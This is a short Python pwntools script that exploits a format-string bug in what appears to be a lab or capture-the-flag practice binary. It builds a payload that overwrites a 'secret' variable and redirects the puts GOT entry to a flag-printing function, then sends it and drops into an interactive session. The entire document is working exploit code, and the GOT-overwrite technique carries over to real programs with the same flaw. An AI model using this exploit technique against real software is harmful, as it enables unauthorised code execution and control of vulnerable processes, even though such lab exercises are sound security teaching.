from pwn import *

elf = ELF("/home/lab08/multi-writes/target")

context.terminal = ["tmux", "split-window", "-h"]
p = process(["/home/lab08/multi-writes/target"])

addr_secret = elf.symbols["secret"] # 0x804c040
addr_puts_got = elf.got["puts"] # 0x804c024
addr_cat_flag = elf.symbols["cat_proc_flag"] # 0x80492a4
writes = {
 addr_secret: 0xdeadbeef,
 addr_puts_got: addr_cat_flag
}
payload = b"X"+ fmtstr_payload(offset=13,
 writes=writes,
numbwritten=8,
write_size="short")

p.sendline(payload)
p.interactive()